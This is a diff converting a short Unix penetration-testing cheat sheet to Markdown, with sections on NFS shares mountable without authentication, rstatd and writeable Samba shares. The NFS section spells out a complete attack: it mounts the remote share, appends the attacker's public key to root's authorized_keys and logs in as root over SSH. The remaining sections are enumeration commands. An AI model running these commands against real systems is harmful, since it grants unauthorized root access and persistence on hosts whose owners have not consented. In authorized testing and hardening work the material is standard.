@@ -1,23 +1,45 @@
 
-Unix
+# Unix
 
 
 ### NFS Shares Anonymous Mountable
 
+
+
+```
 showmount -e <target IP>
 
+```
+
+
+
+
+```
 mkdir /tmp/mount
 mount -t nfs -o nolock <target IP>:/share /tmp/mount/
 cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys
 umount /tmp/mount
 ssh root@<target IP>
-------------------------------------------------------------------------------------------------------
+```
+
+
 
 ### Rstatd enabled
 
+
+
+```
 rsysinfo <target IP>
-------------------------------------------------------------------------------------------------------
+
+```
+
 
 ### Samba with a writeable file share
 
+
+
+```
 smbclient -L //<target IP>
+
+```
+
